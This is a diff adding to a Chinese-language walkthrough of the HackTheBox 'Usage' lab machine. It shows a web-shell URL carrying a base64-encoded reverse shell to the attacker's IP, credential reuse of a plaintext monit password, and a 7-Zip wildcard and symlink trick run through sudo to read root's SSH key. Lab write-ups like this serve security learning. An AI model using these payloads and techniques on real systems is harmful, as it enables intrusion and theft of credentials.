@@ -249,3 +249,287 @@ https://github.com/IDUZZEL/CVE-2023-24249-Exploit
 #### 一旦我们转发请求，图像上传成功，我们可以复制链接到它所在的位置存储
 #### 需要在新的连接输入：http ://admin.usage.htb/uploads/images/shell.jpg.shell?melo=id
 ![必须像正常一样生活](images/092001.png)
+
+
+
+http://admin.usage.htb/uploads/images/shell.jpg.php?melo=echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ5LzQ0NDQgMD4mMQ==%20%7C%20base64%20-d%20%7C%20bash
+
+```
+[★]$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.149] from (UNKNOWN) [10.129.178.97] 49940
+sh: 0: can't access tty; job control turned off
+$ script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+
+dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /home/dash/user.txt
+<dmin/public/uploads/images$ cat /home/dash/user.txt
+
+dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /etc/passwd | grep /bin/bash
+<ic/uploads/images$ cat /etc/passwd | grep /bin/bash          
+root:x:0:0:root:/root:/bin/bash
+dash:x:1000:1000:dash:/home/dash:/bin/bash
+xander:x:1001:1001::/home/xander:/bin/bash
+```
+
+
+```
+dash@usage:/var/www/html/project_admin/public/uploads/images$ ss -tlpn
+ss -tlpn
+State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                 
+LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*                                                           
+LISTEN 0      511          0.0.0.0:80         0.0.0.0:*    users:(("nginx",pid=1223,fd=6),("nginx",pid=1222,fd=6))
+LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                           
+LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                                           
+LISTEN 0      1024       127.0.0.1:2812       0.0.0.0:*    users:(("monit",pid=1818,fd=5))                        
+LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*                                                           
+LISTEN 0      128             [::]:22            [::]:*
+```
+#### 默认情况下，端口3306和33060属于MySQL，我们已经枚举了。端口2812，然而，看起来很有趣，因为它不属于开放端口的典型分类。我们看到port属于进程监视器，进程ID为33663。对我们来说不幸的是，进程窥探似乎在机器上受到限制，因为我们只能看到进程属于我们的用户：
+```
+dash@usage:/var/www/html/project_admin/public/uploads/images$ ps aux
+ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+dash        1222  0.0  0.1  66484  6992 ?        S    16:06   0:00 nginx: worker
+dash        1223  0.0  0.1  66220  5636 ?        S    16:06   0:00 nginx: worker
+dash        1782  0.0  0.0   2892   956 ?        S    16:34   0:00 sh -c echo c2
+dash        1785  0.0  0.0   4364  3252 ?        S    16:34   0:00 bash
+dash        1786  0.0  0.0   2892   976 ?        S    16:34   0:00 sh -i
+dash        1787  0.0  0.0   2808  1100 ?        S    16:35   0:00 script /dev/n
+dash        1788  0.0  0.0   2892   960 pts/0    Ss   16:35   0:00 sh -c bash
+dash        1789  0.0  0.1   5684  4692 pts/0    S    16:35   0:00 bash
+dash        1818  0.0  0.0  84684  3432 ?        Sl   16:37   0:00 /usr/bin/moni
+dash        1826  0.0  0.0   7064  1572 pts/0    R+   16:38   0:00 ps aux
+```
+#### fstab文件也显示了同样多的信息，因为/proc是在将hidepid选项设置为2的情况下挂载的隐藏其他用户的进程：
+```
+dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /etc/fstab
+cat /etc/fstab
+<SNIP>
+proc /proc proc defaults,hidepid=2 0 0
+<SNIP>
+```
+#### /etc/fstab文件：该文件用于定义如何将磁盘分区、其他各种块设备或远程文件系统应该被挂载并集成到文件系统中。proc文件系统：proc文件系统是一个伪文件系统，它提供了一个内核接口数据结构。它通常挂载在/proc。
+#### 挂载选项:
+#### 1.defaults：使用默认的挂载选项，包括rw、suid、dev、exec、auto、nouser和异步。
+#### 2.hidpid =2：该选项隐藏其他用户的进程。当hiddepid =2时，用户看不到任何其他用户的进程及其/proc/[pid]目录。这通过限制来提高安全性其他用户进程的可见性，并降低进程窥探的风险。通过使用hidepid=2选项，系统管理员增加了系统的安全性使用户难以查看他们不拥有的流程并与之交互。这是在多用户环境或运行敏感信息的系统中特别有用需要保护进程不受未授权用户的影响。
+#### 接下来，我们看看是否能找到一个属于monit服务的服务文件：
+```
+dash@usage:~$ find / -name monit.service 2>/dev/null
+find / -name monit.service 2>/dev/null
+/sys/fs/cgroup/system.slice/monit.service
+/usr/share/doc/monit/examples/monit.service
+/etc/systemd/system/monit.service
+/etc/systemd/system/multi-user.target.wants/monit.service
+```
+#### 我们是成功的，所以我们检查服务文件是如何定义的。
+```
+dash@usage:~$ cat /etc/systemd/system//monit.service
+cat /etc/systemd/system//monit.service
+[Unit]
+Description=Monitoring Service
+After=network.target
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=2
+User=dash
+Group=dash
+ExecStart=/usr/bin/monit
+
+[Install]
+WantedBy=multi-user.target
+```
+#### 通过研究该服务，我们发现monit是一个用于管理和监视Unix系统的实用程序。它还进行自动维护和修理，并可配置为在错误情况下执行操作；使它成为一个有趣的候选对象。
+#### 在我们看到监视器正在运行的服务文件dash，这就解释了为什么我们知道它的PID，尽管机器上的进程窥探被禁用了。这使开发变得不那么有趣；尽管如此，我们将仔细查看它的配置，看看是否我们可以学到一些东西。在用户的主目录中，我们找到监控文件，即。monitrc:
+https://mmonit.com/monit/
+```
+dash@usage:~$ ls -al ~
+ls -al ~
+total 52
+drwxr-x--- 6 dash dash 4096 Sep 20 16:48 .
+drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
+drwx------ 3 dash dash 4096 Aug  7  2023 .cache
+drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
+drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
+-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
+-rw-r--r-- 1 dash dash    5 Sep 20 16:48 .monit.pid
+-rw------- 1 dash dash 1192 Sep 20 16:48 .monit.state
+-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
+-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
+drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
+-rw-r----- 1 root dash   33 Sep 20 16:07 user.txt
+```
+#### 在其中，我们找到了admin用户的明文密码：
+```
+dash@usage:~$ cat ~/.monitrc
+cat ~/.monitrc
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd
+
+#Apache
+check process apache with pidfile "/var/run/apache2/apache2.pid"
+    if cpu > 80% for 2 cycles then alert
+
+
+#System Monitoring 
+check system usage
+    if memory usage > 80% for 2 cycles then alert
+    if cpu usage (user) > 70% for 2 cycles then alert
+        if cpu usage (system) > 30% then alert
+    if cpu usage (wait) > 20% then alert
+    if loadavg (1min) > 6 for 2 cycles then alert 
+    if loadavg (5min) > 4 for 2 cycles then alert
+    if swap usage > 5% then alert
+
+check filesystem rootfs with path /
+       if space usage > 80% then alert
+```
+#### 3nc0d3d_pa$$w0rd
+#### 每当我们发现一个密码时，我们应该看看它是否在其他地方被重复使用。我们看到除了对于root用户，存在另一个低权限帐户xander。
+```
+dash@usage:~$ ls -al /home
+ls -al /home
+total 16
+drwxr-xr-x  4 root   root   4096 Aug 16  2023 .
+drwxr-xr-x 19 root   root   4096 Apr  2  2024 ..
+drwxr-x---  6 dash   dash   4096 Sep 20 16:51 dash
+drwxr-x---  4 xander xander 4096 Apr  2  2024 xander
+```
+#### 我们使用su尝试使用发现的密码3nc0d3d_pa$$w0rd验证xander：
+```
+dash@usage:~$ su xander
+su xander
+Password: 3nc0d3d_pa$$w0rd
+
+xander@usage:/home/dash$ id 
+id 
+uid=1001(xander) gid=1001(xander) groups=1001(xander)
+```
+#### 我们的尝试成功了，我们现在可以进入桑德的账户了。我们关闭逆壳层通过SSH进行身份验证以获得更稳定的shell。
+```
+[★]$ ssh xander@usage.htb
+
+xander@usage:~$ sudo -l
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+```
+#### 我们可以看到，我们可以作为根用户执行usage_management二进制文件。有问题的文件似乎是自定义可执行:
+```
+xander@usage:~$ file /usr/bin/usage_management
+/usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped
+```
+### Dynamic Analysis 动态分析
+#### 我们通过简单地运行二进制文件来查看我们能做些什么：
+```
+xander@usage:~$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+```
+#### 我们可以选择备份项目、MySQL数据库或重置管理员的密码。选项一似乎运行7zip命令在/var/backups目录下创建一个备份
+```
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)
+
+Scanning the drive:
+2984 folders, 17973 files, 114778869 bytes (110 MiB)
+
+Creating archive: /var/backups/project.zip
+
+Items to compress: 20957
+
+                                                                               
+Files read from disk: 17973
+Archive size: 54871802 bytes (53 MiB)
+Everything is Ok
+```
+#### 选项二运行时不产生任何输出，但我们确实看到了一个mysql_backup。中创建的SQL文件与项目备份相同的目录：
+```
+xander@usage:~$ ls -al /var/backups/
+<SNIP>
+-rw-r--r--  1 root root  1337117 Sep 20 17:07 mysql_backup.sql
+-rw-r--r--  1 root root 54871802 Sep 20 17:08 project.zip
+```
+#### 最后，选项3只说明密码已重置：
+```
+xander@usage:~$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 3
+Password has been reset.
+```
+### Static Analysis 静态分析
+#### 要初步掌握二进制文件的行为，一种直接而有效的方法是在其上运行字符串。这有时会泄露硬编码密码或其他重要信息。
+```
+xander@usage:~$ strings /usr/bin/usage_management
+/lib64/ld-linux-x86-64.so.2
+chdir
+<SNIP>
+/var/www/html
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+Error changing working directory to /var/www/html
+/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
+Password has been reset.
+Choose an option:
+<SNIP>
+```
+#### 在这种情况下，我们看到的命令提供了对工具行为的洞察。首先，MySQL备份似乎是使用mysqldump执行的，这是一种常见的做法，并且在这里实现得很好。
+/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
+#### 接下来，我们看到通过7zip触发项目备份的命令：
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+```
+A 表示追加模式，将文件添加到指定的归档文件（/var/backup /project.zip）中。
+-tzip 指定目标归档文件的文件类型，即ZIP
+-snl 将符号链接存储为链接（而不是它们指向的文件）
+-mmt 启用多线程以实现更快的压缩
+—-* 包含当前目录下的所有文件和目录
+```
+#### 该命令遵循chdir命令，该命令尝试将当前工作目录（CWD）设置为 /var/www/html。
+#### snl标志指向符号链接，这是一种常见的错误配置转向攻击向量。根据根据HackTricks的一篇文章，如果我们得到许可，7zip可以被滥用，在存档中包含任意文件将符号链接写入源目标。在本例中，源文件是/var/www/html。
+https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#id-7z
+```
+xander@usage:~$ ls -ld  /var/www/html/
+drwxrwxrwx 4 root xander 4096 Apr  3  2024 /var/www/html/
+```
+#### 由于我们对目录具有RWX权限，因此可以利用usage_management工具读取任意文件，如根用户的私有SSH密钥
+### Steps to Exploit 利用步骤
+#### 1. 导航到/var/www/html，创建一个名为@id_rsa的文件：@id_rsa文件（也称为listfile）告诉7zip id_rsa包含了一个文件列表压缩。但是，由于id_rsa将是根用户的私有SSH密钥的符号链接，所以7zip将读取并显示此文件的内容。创建@id_rsa确保7zip在id_rsa符号链接中查找文件列表。
+```
+xander@usage:~$ cd /var/www/html
+xander@usage:/var/www/html$ touch @id_rsa
+```
+#### 2. 创建一个指向根用户SSH密钥的符号链接：这个名为id_rsa的符号链接指向我们想要读取的实际文件。当7zip试图读取id_rsa中的文件列表，它读取/root/.ssh/id_rsa。
+
+#### 3. 使用sudo运行该工具并选择Project Backup选项：此步骤触发7zip命令，该命令跟随符号链接并包含根文件中的SSH密钥。
+
+#### 我们看到私有SSH密钥确实包含在输出中，因此我们将其粘贴到本地机器上并正确格式化：
+
+
+### 后记
+#### 为什么@id_rsa启用漏洞
+#### @id_rsa的存在欺骗7zip将id_rsa视为要压缩的文件列表。因为id_rsa是symlink到根的SSH密钥，7zip读取SSH密钥文件的内容，导致内容为包含在输出中。
+#### -snl标志的作用
+#### 用于创建存档的完整7z命令如下：
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+#### snl标志的定义如下：
+-snl : store symbolic links as links
+#### 虽然有人可能会认为这将打破我们刚刚滥用的向量，但这个标志并不能阻止这种利用。相反，它确保符号链接本身存储在存档中，而不是它所指向的文件中。然而,当7zip读取id_rsa符号链接作为文件列表时，它仍然遵循符号链接读取目标文件的符号链接内容，该内容允许该漏洞工作。
